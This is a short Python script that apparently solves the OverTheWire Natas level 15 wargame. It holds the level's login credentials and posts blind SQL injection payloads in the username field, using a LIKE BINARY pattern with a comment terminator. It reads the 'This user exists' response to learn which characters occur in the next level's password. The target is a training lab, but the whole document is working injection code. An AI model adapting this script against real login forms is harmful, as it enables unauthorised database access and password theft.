import requests

URL = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'
ss = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = requests.Session()
a = ''

for ch in ss:
   data = {'username':'natas16" and password LIKE BINARY "%'+ch+'%" -- '}
   r = s.post(URL, data=data)
   if 'This user exists' in r.text:
       #print(ch)
       a = a+ch

print(a)
